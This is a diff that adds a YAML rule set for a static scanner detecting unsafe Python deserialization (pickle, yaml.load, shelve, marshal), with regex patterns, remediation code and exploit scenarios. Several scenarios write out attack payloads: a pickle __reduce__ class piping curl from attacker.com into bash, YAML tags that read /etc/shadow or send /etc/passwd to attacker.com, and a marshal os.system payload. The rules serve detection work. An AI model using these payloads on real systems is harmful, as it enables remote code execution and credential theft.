@@ -1,0 +1,1582 @@
+rules:
+  # ============================================================================
+  # DESER-PY-001: pickle.loads / pickle.load with Untrusted Data
+  # ============================================================================
+  - rule_id: "DESER-PY-001"
+    title: "Pickle Deserialization of Untrusted Data Leading to Remote Code Execution"
+    description: >
+      Detects usage of pickle.loads(), pickle.load(), cPickle.loads(),
+      cPickle.load(), or _pickle.loads() on data originating from untrusted
+      sources. Python's pickle module can serialize and deserialize arbitrary
+      Python objects including code objects. The __reduce__ method allows any
+      class to define custom reconstruction logic that executes during
+      unpickling. An attacker who can control pickled data can achieve
+      arbitrary code execution by crafting a payload that invokes os.system,
+      subprocess.Popen, or any other callable during deserialization.
+    language: python
+    category: deserialization
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - pickle
+      - rce
+      - python
+      - critical
+      - untrusted-data
+      - code-execution
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'pickle\.(loads?|Unpickler)\s*\(\s*(request\.|data|payload|body|content|message|received|raw|user_input)'
+        description: "pickle.load/loads called on user-controlled variable"
+      - type: regex
+        pattern: 'cPickle\.(loads?|Unpickler)\s*\(\s*(request\.|data|payload|body|content|message)'
+        description: "cPickle.load/loads on user-controlled input"
+      - type: regex
+        pattern: '_pickle\.(loads?|Unpickler)\s*\('
+        description: "Internal _pickle module usage for deserialization"
+      - type: regex
+        pattern: 'pickle\.loads?\s*\(\s*(base64\.b64decode|binascii\.unhexlify|codecs\.decode)\s*\('
+        description: "pickle.load on decoded data from encoded source"
+      - type: regex
+        pattern: 'pickle\.loads?\s*\(\s*request\.(get_data|get_json|form|args|files)'
+        description: "pickle.loads on Flask request data"
+      - type: regex
+        pattern: 'pickle\.loads?\s*\(\s*(redis_client|r|cache|memcache|mc)\.(get|hget|lpop|rpop|brpop)\s*\('
+        description: "pickle.loads on data retrieved from cache/message queue"
+      - type: regex
+        pattern: 'pickle\.loads?\s*\(\s*socket\.\w*recv'
+        description: "pickle.loads on data received from network socket"
+      - type: regex
+        pattern: 'Unpickler\s*\(\s*(io\.BytesIO|BytesIO)\s*\(\s*(data|payload|body|content|request)'
+        description: "Unpickler initialized with BytesIO wrapping untrusted data"
+    anti_patterns:
+      - 'pickle\.loads?\s*\(\s*pickle\.dumps?\s*\('
+      - 'pickle\.loads?\s*\(\s*open\s*\(\s*["\x27](/etc/|config|settings)'
+      - 'pickle\.loads?\s*\(\s*["\x27]'
+      - '#\s*nosec'
+      - '#\s*noqa'
+      - 'hmac\.compare_digest.*pickle'
+      - 'signed_cookie.*pickle'
+      - 'pickle\.loads?\s*\(\s*self\._cache'
+      - 'pickle\.loads?\s*\(\s*internal'
+      - 'pickle\.loads?\s*\(\s*trusted'
+      - 'RestrictedUnpickler.*pickle'
+      - 'find_class.*restrict'
+      - 'pickle\.loads?\s*\(\s*(fixture|mock|test_data|sample)'
+      - 'pickle\.loads?\s*\(\s*self\.\w+_data\s*\)'
+      - 'pickle\.loads?\s*\(\s*Path\s*\('
+    bypass_variants:
+      - description: "Using __reduce__ method to execute os.system during unpickling"
+        pattern: '__reduce__\s*\(.*\)\s*:\s*return\s*\(\s*os\.system'
+      - description: "Aliasing pickle module to evade static analysis"
+        pattern: '(import\s+pickle\s+as\s+\w+|\w+\s*=\s*__import__\s*\(\s*["\x27]pickle["\x27]\s*\))'
+      - description: "Using pickletools or copyreg to construct malicious payload"
+        pattern: '(pickletools|copyreg)\.\w+.*pickle\.(loads|Unpickler)'
+    evasion_indicators:
+      - "Module aliasing of pickle to bypass static analysis"
+      - "__import__('pickle') dynamic import"
+      - "Base64 or hex-encoded pickle payload"
+      - "Pickle protocol version manipulation"
+      - "Use of pickletools to obfuscate payload opcodes"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'pickle\.loads?\s*\(\s*base64\.(b64decode|decodebytes)\s*\('
+      - type: "hex"
+        pattern: 'pickle\.loads?\s*\(\s*(bytes\.fromhex|binascii\.unhexlify)\s*\('
+      - type: "zlib_compressed"
+        pattern: 'pickle\.loads?\s*\(\s*zlib\.decompress\s*\('
+    multi_function_chain_patterns:
+      - "HTTP request -> base64 decode -> pickle.loads -> code execution"
+      - "Redis get -> pickle.loads -> object instantiation -> method call"
+      - "File upload -> read content -> pickle.loads -> RCE"
+      - "Message queue consume -> pickle.loads -> task execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Pickle deserialization executes arbitrary Python code with the permissions of the running process, typically the web server user"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body / form data / file upload"
+        sink: "pickle.loads / pickle.load"
+        through: "Direct parameter passing or base64 decoding"
+      - source: "Redis / Memcached cached value"
+        sink: "pickle.loads"
+        through: "Cache get operation (cache poisoning scenario)"
+      - source: "Message queue (Celery/RabbitMQ/SQS)"
+        sink: "pickle.loads"
+        through: "Task serializer deserialization"
+    impact: |
+      Pickle deserialization of untrusted data leads to:
+      - Arbitrary Remote Code Execution with server process privileges
+      - Full server compromise including file system access
+      - Data exfiltration from databases and internal services
+      - Lateral movement within the network
+      - Persistent backdoor installation
+      - Complete confidentiality, integrity, and availability compromise
+    remediation: |
+      1. Never use pickle with untrusted data. Use JSON or other safe formats:
+         ```python
+         import json
+         data = json.loads(user_input)
+         ```
+      2. If pickle is absolutely required, implement a restricted unpickler:
+         ```python
+         import pickle
+         import io
+
+         ALLOWED_CLASSES = {
+             ('myapp.models', 'SafeModel'),
+             ('builtins', 'dict'),
+             ('builtins', 'list'),
+         }
+
+         class RestrictedUnpickler(pickle.Unpickler):
+             def find_class(self, module, name):
+                 if (module, name) not in ALLOWED_CLASSES:
+                     raise pickle.UnpicklingError(
+                         f"Forbidden class: {module}.{name}"
+                     )
+                 return super().find_class(module, name)
+
+         def safe_loads(data):
+             return RestrictedUnpickler(io.BytesIO(data)).load()
+         ```
+      3. Sign pickled data with HMAC before storing and verify before loading.
+      4. Use Celery with JSON serializer instead of pickle.
+      5. Implement Content Security Policy for stored objects.
+    references:
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://docs.python.org/3/library/pickle.html#restricting-globals"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://blog.nelhage.com/2011/03/exploiting-pickle/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "pickle import in same file"
+        - "No RestrictedUnpickler implementation"
+        - "User-controlled data flows into pickle.loads"
+        - "No HMAC verification before unpickling"
+      taint_source_indicators:
+        - "request.data"
+        - "request.body"
+        - "request.files"
+        - "socket.recv"
+        - "redis.get"
+        - "queue.get"
+      taint_sink_indicators:
+        - "pickle.loads"
+        - "pickle.load"
+        - "cPickle.loads"
+        - "Unpickler.load"
+        - "_pickle.loads"
+      sanitization_patterns:
+        - "RestrictedUnpickler with find_class override"
+        - "HMAC signature verification"
+        - "Allowlist-based class restriction"
+        - "Pickle data source authentication"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - restricted_unpickler_present)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Flask web application accepts serialized Python objects via an API
+        endpoint for batch data import. The endpoint reads the request body
+        and passes it to pickle.loads(). An attacker crafts a pickle payload:
+        import pickle, os
+        class Exploit:
+            def __reduce__(self):
+                return (os.system, ('curl attacker.com/shell.sh | bash',))
+        payload = pickle.dumps(Exploit())
+        The attacker sends this payload as the request body. When the server
+        calls pickle.loads(request.data), the __reduce__ method is invoked,
+        executing os.system with the attacker's command, establishing a
+        reverse shell.
+      example_payload: "b\"\\x80\\x04\\x95...cos\\nsystem\\n...curl attacker.com/shell.sh|bash...\""
+      attacker_objective: "Execute arbitrary system commands on the server through pickle deserialization to establish persistent access"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PY-002"
+        - "DESER-PY-003"
+        - "DESER-PY-006"
+        - "DESER-PY-007"
+
+  # ============================================================================
+  # DESER-PY-002: yaml.load without SafeLoader
+  # ============================================================================
+  - rule_id: "DESER-PY-002"
+    title: "PyYAML yaml.load Without SafeLoader Enabling Code Execution"
+    description: >
+      Detects usage of yaml.load() without specifying Loader=yaml.SafeLoader
+      or Loader=yaml.BaseLoader. In PyYAML versions prior to 6.0, yaml.load()
+      defaults to yaml.FullLoader (or yaml.Loader in older versions) which
+      supports Python-specific YAML tags such as !!python/object,
+      !!python/object/apply, and !!python/module. These tags allow
+      instantiation of arbitrary Python objects during YAML parsing,
+      leading to remote code execution when processing untrusted YAML input.
+    language: python
+    category: deserialization
+    severity: Critical
+    confidence: 0.93
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - yaml
+      - pyyaml
+      - rce
+      - unsafe-loader
+      - python
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'yaml\.load\s*\(\s*[^)]*\)\s*(?!.*Loader\s*=\s*(SafeLoader|BaseLoader|yaml\.SafeLoader|yaml\.BaseLoader))'
+        description: "yaml.load called without SafeLoader or BaseLoader"
+      - type: regex
+        pattern: 'yaml\.load\s*\(\s*(request\.|data|payload|body|content|input|raw|text|stream)'
+        description: "yaml.load on user-controlled input without safe loader"
+      - type: regex
+        pattern: 'yaml\.load\s*\([^)]*Loader\s*=\s*(yaml\.)?(Loader|FullLoader|UnsafeLoader)'
+        description: "yaml.load with explicitly unsafe Loader parameter"
+      - type: regex
+        pattern: 'yaml\.load_all\s*\(\s*(request\.|data|payload|body|content|input)'
+        description: "yaml.load_all processing multiple documents from untrusted source"
+      - type: regex
+        pattern: 'yaml\.unsafe_load\s*\('
+        description: "Explicit yaml.unsafe_load function call"
+      - type: regex
+        pattern: 'yaml\.full_load\s*\(\s*(request\.|data|payload|body|content|input)'
+        description: "yaml.full_load on untrusted data"
+      - type: regex
+        pattern: 'yaml\.load\s*\(\s*(open|f\.read|file\.read|stream\.read)'
+        description: "yaml.load on file content that may be user-controlled"
+      - type: regex
+        pattern: 'yaml\.load\s*\(\s*(response\.(text|content|json)|urllib|requests\.\w+)'
+        description: "yaml.load on data fetched from external sources"
+    anti_patterns:
+      - 'yaml\.safe_load\s*\('
+      - 'yaml\.load\s*\([^)]*Loader\s*=\s*(yaml\.)?SafeLoader'
+      - 'yaml\.load\s*\([^)]*Loader\s*=\s*(yaml\.)?BaseLoader'
+      - 'yaml\.load\s*\(\s*["\x27]'
+      - 'yaml\.safe_load_all\s*\('
+      - 'yaml\.load\s*\(\s*open\s*\(\s*["\x27](/etc/|config\.y|settings\.y)'
+      - '#\s*nosec'
+      - '#\s*noqa'
+      - 'yaml\.load\s*\(\s*fixture'
+      - 'yaml\.load\s*\(\s*mock'
+      - 'yaml\.load\s*\(\s*test'
+      - 'yaml\.load\s*\(\s*sample'
+      - 'yaml\.load\s*\(\s*Path\s*\(\s*__file__'
+      - 'yaml\.load\s*\(\s*pkg_resources'
+      - 'yaml\.load\s*\(\s*importlib'
+    bypass_variants:
+      - description: "Using !!python/object/apply tag to invoke arbitrary callables"
+        pattern: '!!python/object/apply\s*:\s*\w+'
+      - description: "Dynamic Loader class construction to bypass safe loader checks"
+        pattern: 'type\s*\(\s*["\x27]\w+Loader["\x27].*yaml\.(Loader|FullLoader)'
+      - description: "Monkey-patching yaml.SafeLoader to add unsafe constructors"
+        pattern: 'yaml\.SafeLoader\.add_constructor\s*\(\s*["\x27]!!python'
+    evasion_indicators:
+      - "Aliasing yaml module to bypass static detection"
+      - "Dynamic Loader class selection based on configuration"
+      - "Custom constructor registration on SafeLoader (weakening it)"
+      - "Base64 or hex-encoded YAML content"
+      - "YAML tag obfuscation via anchors and aliases"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'yaml\.load\s*\(\s*base64\.(b64decode|decodebytes)\s*\('
+      - type: "url_encoded"
+        pattern: 'yaml\.load\s*\(\s*urllib\.parse\.unquote\s*\('
+      - type: "compressed"
+        pattern: 'yaml\.load\s*\(\s*(zlib\.decompress|gzip\.decompress)\s*\('
+    multi_function_chain_patterns:
+      - "HTTP request -> yaml.load -> config mutation -> privilege escalation"
+      - "File upload -> read content -> yaml.load -> RCE"
+      - "API response -> yaml.load -> data processing -> injection"
+      - "Git webhook -> yaml.load CI config -> build command execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "YAML deserialization with FullLoader/Loader allows construction of arbitrary Python objects, executing code during parsing"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body / file upload"
+        sink: "yaml.load"
+        through: "Direct parameter passing"
+      - source: "Configuration file from untrusted source"
+        sink: "yaml.load"
+        through: "File read operation"
+      - source: "External API response"
+        sink: "yaml.load"
+        through: "HTTP client response parsing"
+    impact: |
+      Unsafe YAML deserialization in Python can result in:
+      - Remote Code Execution via !!python/object/apply tags
+      - Arbitrary object instantiation leading to server compromise
+      - File system access through crafted YAML constructors
+      - Denial of Service via billion-laughs YAML bomb
+      - Information disclosure through object attribute access
+    remediation: |
+      1. Always use yaml.safe_load instead of yaml.load:
+         ```python
+         import yaml
+         data = yaml.safe_load(user_input)
+         ```
+      2. If yaml.load is required, always specify SafeLoader:
+         ```python
+         data = yaml.load(user_input, Loader=yaml.SafeLoader)
+         ```
+      3. For multiple documents, use yaml.safe_load_all:
+         ```python
+         for doc in yaml.safe_load_all(user_input):
+             process(doc)
+         ```
+      4. Set YAML input size limits to prevent DoS attacks.
+      5. Upgrade PyYAML to version 6.0+ which warns on unsafe usage.
+    references:
+      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1747"
+      - "https://pyyaml.org/wiki/PyYAMLDocumentation"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "yaml/pyyaml import in same file"
+        - "No Loader parameter in yaml.load call"
+        - "User-controlled data flows into yaml.load"
+        - "No input size validation before YAML parsing"
+      taint_source_indicators:
+        - "request.data"
+        - "request.body"
+        - "file.read()"
+        - "response.text"
+        - "open().read()"
+        - "stdin.read()"
+      taint_sink_indicators:
+        - "yaml.load"
+        - "yaml.load_all"
+        - "yaml.unsafe_load"
+        - "yaml.full_load"
+        - "YAML().load"
+      sanitization_patterns:
+        - "Loader=yaml.SafeLoader"
+        - "Loader=yaml.BaseLoader"
+        - "yaml.safe_load"
+        - "Input size limit check"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - safe_loader_present)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Django REST API accepts YAML-formatted configuration uploads. The
+        view processes uploaded files using yaml.load(file_content). An
+        attacker uploads a YAML file containing:
+        !!python/object/apply:subprocess.check_output
+        args: [['cat', '/etc/shadow']]
+        When yaml.load processes this, it invokes subprocess.check_output
+        with the attacker's command, reading the shadow password file. The
+        result is returned as part of the deserialized object, leaking
+        sensitive system information.
+      example_payload: "!!python/object/apply:os.system ['curl attacker.com/$(cat /etc/passwd | base64)']"
+      attacker_objective: "Execute arbitrary system commands through YAML deserialization to exfiltrate sensitive data"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PY-001"
+        - "DESER-JS-003"
+
+  # ============================================================================
+  # DESER-PY-003: shelve / dbm Deserialization
+  # ============================================================================
+  - rule_id: "DESER-PY-003"
+    title: "shelve or dbm Module Deserialization of Untrusted Database Files"
+    description: >
+      Detects usage of Python's shelve module or direct dbm usage on database
+      files from untrusted sources. The shelve module uses pickle internally
+      to serialize and deserialize values stored in dbm-style databases.
+      Opening a shelve database file from an untrusted source and accessing
+      any value triggers pickle deserialization, which can lead to arbitrary
+      code execution. Similarly, crafted dbm files can exploit parser bugs
+      in the underlying database library.
+    language: python
+    category: deserialization
+    severity: High
+    confidence: 0.90
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - shelve
+      - dbm
+      - pickle
+      - python
+      - file-based
+      - rce
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'shelve\.open\s*\(\s*(request\.|data|payload|path|filename|user_input|upload|file_path)'
+        description: "shelve.open on user-controlled file path"
+      - type: regex
+        pattern: 'shelve\.open\s*\(\s*os\.path\.join\s*\([^)]*request\.'
+        description: "shelve.open with path constructed from request data"
+      - type: regex
+        pattern: 'dbm\.(open|gnu\.open|ndbm\.open)\s*\(\s*(request\.|data|payload|path|filename|user_input)'
+        description: "dbm.open on user-controlled file path"
+      - type: regex
+        pattern: 'shelve\.open\s*\(\s*(temp|tmp|upload|download)'
+        description: "shelve.open on temporary or uploaded file"
+      - type: regex
+        pattern: 'shelve\.DbfilenameShelf\s*\(\s*(request\.|data|path|filename)'
+        description: "Direct DbfilenameShelf instantiation with untrusted path"
+      - type: regex
+        pattern: 'shelve\.open\s*\(\s*f["\x27]'
+        description: "shelve.open with f-string path potentially including user input"
+    anti_patterns:
+      - 'shelve\.open\s*\(\s*["\x27](/var/lib/|/opt/|/etc/|config|internal|settings)'
+      - 'shelve\.open\s*\(\s*os\.path\.join\s*\(\s*BASE_DIR'
+      - 'shelve\.open\s*\(\s*["\x27][a-zA-Z_]+["\x27]\s*\)'
+      - '#\s*nosec'
+      - '#\s*noqa'
+      - 'shelve\.open\s*\(\s*self\._db_path'
+      - 'mock.*shelve'
+      - 'shelve\.open\s*\(\s*fixture'
+      - 'shelve\.open\s*\(\s*test_'
+      - '\/\/\s*test'
+      - 'shelve\.open\s*\(\s*os\.path\.join\s*\(\s*["\x27]'
+      - 'shelve\.open\s*\(\s*CACHE_DIR'
+      - 'shelve\.open\s*\(\s*DATA_DIR'
+    bypass_variants:
+      - description: "Path traversal to access attacker-controlled shelve file"
+        pattern: 'shelve\.open\s*\([^)]*\.\.\/'
+      - description: "Symlink-based attack on shelve database path"
+        pattern: 'os\.path\.realpath\s*\([^)]*\).*shelve\.open'
+      - description: "Uploading a shelve database file then opening it"
+        pattern: '(save|write|upload).*\.(db|dir|bak|dat).*shelve\.open'
+    evasion_indicators:
+      - "Uploaded file stored then opened with shelve.open"
+      - "Path traversal in shelve.open argument"
+      - "Symlink following to attacker-controlled database"
+      - "Temporary file used as shelve database from upload"
+    encoding_variants:
+      - type: "path_traversal"
+        pattern: 'shelve\.open\s*\(\s*["\x27].*\.\.\/'
+      - type: "url_decoded_path"
+        pattern: 'shelve\.open\s*\(\s*urllib\.parse\.unquote\s*\('
+      - type: "base64_path"
+        pattern: 'shelve\.open\s*\(\s*base64\.b64decode\s*\('
+    multi_function_chain_patterns:
+      - "File upload -> save to disk -> shelve.open -> pickle deserialization -> RCE"
+      - "File path from request -> shelve.open -> key access -> code execution"
+      - "Download remote file -> shelve.open -> data extraction -> compromise"
+      - "User-controlled path -> os.path.join -> shelve.open -> value read"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Shelve internally uses pickle, so opening an attacker-controlled shelve database file and reading any key triggers arbitrary code execution"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "File upload / user-controlled file path"
+        sink: "shelve.open"
+        through: "File system save then open"
+      - source: "Request parameter (file path)"
+        sink: "shelve.open"
+        through: "Path construction from user input"
+      - source: "Downloaded file from external URL"
+        sink: "shelve.open"
+        through: "HTTP download then file open"
+    impact: |
+      Shelve/dbm deserialization of untrusted files can lead to:
+      - Remote Code Execution via pickle payloads in shelve values
+      - Arbitrary file system access through path traversal
+      - Data corruption of legitimate shelve databases
+      - Denial of Service through malformed database files
+      - Privilege escalation if shelve is accessed by privileged processes
+    remediation: |
+      1. Never open shelve databases from untrusted sources:
+         ```python
+         # Bad: user-controlled path
+         db = shelve.open(user_provided_path)
+
+         # Good: use fixed, application-controlled paths
+         db = shelve.open(os.path.join(APP_DATA_DIR, 'internal_cache'))
+         ```
+      2. Replace shelve with a safe database solution:
+         ```python
+         import sqlite3
+         conn = sqlite3.connect(os.path.join(APP_DATA_DIR, 'data.db'))
+         ```
+      3. If shelve must be used, validate and sanitize file paths.
+      4. Use JSON-based storage for user-submitted data.
+      5. Implement file upload validation to reject shelve database file types.
+    references:
+      - "https://docs.python.org/3/library/shelve.html#restrictions"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "shelve import in same file"
+        - "File upload handling before shelve.open"
+        - "User-controlled variable in shelve.open argument"
+        - "No path validation before shelve.open"
+      taint_source_indicators:
+        - "request.files"
+        - "request.form['path']"
+        - "sys.argv"
+        - "os.environ (user-set)"
+        - "uploaded file path"
+      taint_sink_indicators:
+        - "shelve.open"
+        - "dbm.open"
+        - "shelve.DbfilenameShelf"
+        - "dbm.gnu.open"
+        - "dbm.ndbm.open"
+      sanitization_patterns:
+        - "os.path.basename for path filtering"
+        - "Path allowlist check"
+        - "File extension validation"
+        - "os.path.realpath to resolve symlinks"
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (user_controlled_path ? 1.3 : 0.7)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A file management application allows users to upload database files
+        for analysis. The backend opens uploaded files using shelve.open()
+        to read their contents. An attacker creates a malicious shelve
+        database by setting a key's value to a pickle payload containing a
+        __reduce__ method that spawns a reverse shell. When the application
+        opens the uploaded file and reads the key, pickle deserialization
+        executes the attacker's code on the server.
+      example_payload: "Crafted .db file with shelve value containing pickle __reduce__ -> os.system('reverse shell')"
+      attacker_objective: "Execute arbitrary code by uploading a crafted shelve database file that triggers pickle deserialization"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PY-001"
+        - "DESER-PY-004"
+
+  # ============================================================================
+  # DESER-PY-004: marshal.loads Deserialization
+  # ============================================================================
+  - rule_id: "DESER-PY-004"
+    title: "marshal.loads Deserialization of Untrusted Data"
+    description: >
+      Detects usage of Python's marshal module (marshal.loads, marshal.load)
+      on untrusted input. The marshal module is designed for reading and
+      writing Python bytecode (.pyc files) and can deserialize code objects.
+      Processing untrusted marshal data can lead to code execution when the
+      deserialized code object is subsequently evaluated, and can cause
+      crashes or undefined behavior due to malformed bytecode. The Python
+      documentation explicitly warns against unmarshalling untrusted data.
+    language: python
+    category: deserialization
+    severity: High
+    confidence: 0.92
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - marshal
+      - bytecode
+      - python
+      - code-execution
+      - critical
+      - internal
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'marshal\.loads?\s*\(\s*(request\.|data|payload|body|content|input|raw|received|message)'
+        description: "marshal.loads/load on user-controlled input"
+      - type: regex
+        pattern: 'marshal\.loads?\s*\(\s*(base64\.b64decode|binascii\.unhexlify)\s*\('
+        description: "marshal.loads on decoded data from encoded source"
+      - type: regex
+        pattern: 'marshal\.loads?\s*\(\s*open\s*\(\s*(request\.|user_|upload|temp|tmp)'
+        description: "marshal.load on file opened from user-controlled path"
+      - type: regex
+        pattern: 'marshal\.loads?\s*\(\s*socket\.\w*recv'
+        description: "marshal.loads on data received from network socket"
+      - type: regex
+        pattern: 'marshal\.loads?\s*\(\s*(redis|cache|memcache|mc)\.(get|hget)\s*\('
+        description: "marshal.loads on data from cache store"
+      - type: regex
+        pattern: 'types\.CodeType\s*\(.*marshal\.loads'
+        description: "Code object construction from marshalled data"
+    anti_patterns:
+      - 'marshal\.loads?\s*\(\s*marshal\.dumps?\s*\('
+      - 'marshal\.loads?\s*\(\s*["\x27]'
+      - '#\s*nosec'
+      - '#\s*noqa'
+      - 'marshal\.loads?\s*\(\s*open\s*\(\s*["\x27]'
+      - 'marshal\.loads?\s*\(\s*(fixture|mock|test|sample)'
+      - 'marshal\.loads?\s*\(\s*internal'
+      - 'marshal\.loads?\s*\(\s*trusted'
+      - 'marshal\.loads?\s*\(\s*self\.\w+'
+      - 'marshal\.loads?\s*\(\s*Path\s*\('
+      - '\.pyc.*marshal\.loads'
+      - 'importlib.*marshal'
+      - 'compile.*marshal'
+    bypass_variants:
+      - description: "Marshal data containing code object executed via exec/eval"
+        pattern: 'exec\s*\(\s*marshal\.loads\s*\('
+      - description: "Dynamic import of marshal to evade static analysis"
+        pattern: '__import__\s*\(\s*["\x27]marshal["\x27]\s*\)\.loads\s*\('
+      - description: "Code object from marshal used in types.FunctionType"
+        pattern: 'types\.FunctionType\s*\(\s*marshal\.loads\s*\('
+    evasion_indicators:
+      - "Dynamic import of marshal module"
+      - "Base64 or hex-encoded marshal payload"
+      - "Code object extracted from marshal used in exec/eval"
+      - "types.FunctionType construction from marshal data"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'marshal\.loads?\s*\(\s*base64\.(b64decode|decodebytes)\s*\('
+      - type: "hex"
+        pattern: 'marshal\.loads?\s*\(\s*(bytes\.fromhex|binascii\.unhexlify)\s*\('
+      - type: "zlib"
+        pattern: 'marshal\.loads?\s*\(\s*zlib\.decompress\s*\('
+    multi_function_chain_patterns:
+      - "HTTP request -> base64 decode -> marshal.loads -> exec -> RCE"
+      - "File upload -> read bytes -> marshal.loads -> code object -> exec"
+      - "Network socket -> recv -> marshal.loads -> types.FunctionType -> call"
+      - "Cache get -> marshal.loads -> eval -> code execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Marshal data can contain code objects that when executed provide arbitrary code execution with the process privileges"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body / file upload"
+        sink: "marshal.loads"
+        through: "Direct parameter or decoded bytes"
+      - source: "Network socket data"
+        sink: "marshal.loads"
+        through: "Socket receive"
+      - source: "Cache/database stored value"
+        sink: "marshal.loads"
+        through: "Cache get (poisoned cache)"
+    impact: |
+      Marshal deserialization of untrusted data can lead to:
+      - Arbitrary code execution through deserialized code objects
+      - Python interpreter crash via malformed bytecode
+      - Denial of Service through resource exhaustion
+      - Information disclosure through code object introspection
+      - Full server compromise when code objects are executed
+    remediation: |
+      1. Never use marshal with untrusted data:
+         ```python
+         # Bad: marshal on untrusted input
+         code = marshal.loads(user_data)
+
+         # Good: use JSON for data exchange
+         import json
+         data = json.loads(user_data)
+         ```
+      2. The marshal module is for internal Python use only (pyc files).
+      3. Use safe serialization formats (JSON, MessagePack) for external data.
+      4. If code execution is required, use a sandboxed environment.
+      5. Implement strict input validation before any deserialization.
+    references:
+      - "https://docs.python.org/3/library/marshal.html"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "marshal import in same file"
+        - "exec or eval call on marshal.loads result"
+        - "types.FunctionType or types.CodeType usage with marshal data"
+        - "No input validation before marshal.loads"
+      taint_source_indicators:
+        - "request.data"
+        - "socket.recv"
+        - "file.read"
+        - "redis.get"
+        - "network input"
+      taint_sink_indicators:
+        - "marshal.loads"
+        - "marshal.load"
+        - "exec"
+        - "eval"
+        - "types.FunctionType"
+      sanitization_patterns:
+        - "Source authentication before deserialization"
+        - "HMAC verification on serialized data"
+        - "Input from trusted internal source only"
+        - "Sandboxed execution environment"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (exec_present ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A code-sharing platform accepts compiled Python bytecode for execution
+        in what is intended to be a sandboxed environment. The backend uses
+        marshal.loads to deserialize the submitted bytecode and exec to run
+        it. An attacker submits crafted marshal data containing a code object
+        that imports os and executes system commands, bypassing the intended
+        sandbox restrictions. The malicious bytecode reads environment
+        variables containing database credentials and exfiltrates them.
+      example_payload: "marshal.dumps(compile('import os; os.system(\"id\")', '<exploit>', 'exec'))"
+      attacker_objective: "Execute arbitrary Python bytecode through marshal deserialization to escape sandbox and access system resources"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
